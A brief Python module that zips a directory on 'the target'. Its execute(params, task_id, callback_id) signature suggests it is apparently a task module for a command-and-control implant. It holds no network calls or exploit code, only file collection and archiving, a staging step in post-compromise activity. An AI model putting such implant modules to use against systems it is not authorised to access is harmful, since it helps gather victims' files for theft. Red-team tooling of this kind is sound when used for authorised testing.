import os
import json
import zipfile


# Recursively zips a directory on the target and saves it to the specified destination path
def execute(params, task_id, callback_id):
    try:
        parsed = json.loads(params)
        src  = parsed.get("src", "").strip()
        dest = parsed.get("dest", "").strip()
    except Exception:
        return "zip: invalid parameters"

    if not src or not dest:
        return "zip: src and dest are required"

    src = os.path.expanduser(src)

    if not os.path.exists(src):
        return f"zip: {src}: no such file or directory"
    if not os.path.isdir(src):
        return f"zip: {src}: not a directory"

    try:
        os.makedirs(os.path.dirname(os.path.abspath(dest)), exist_ok=True)
        with zipfile.ZipFile(dest, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(src):
                for file in files:
                    abs_path = os.path.join(root, file)
                    arcname  = os.path.relpath(abs_path, os.path.dirname(src))
                    zf.write(abs_path, arcname)
        return f"zipped {src} -> {dest}"
    except PermissionError as e:
        return f"zip: permission denied: {str(e)}"
    except Exception as e:
        return f"zip error: {str(e)}"
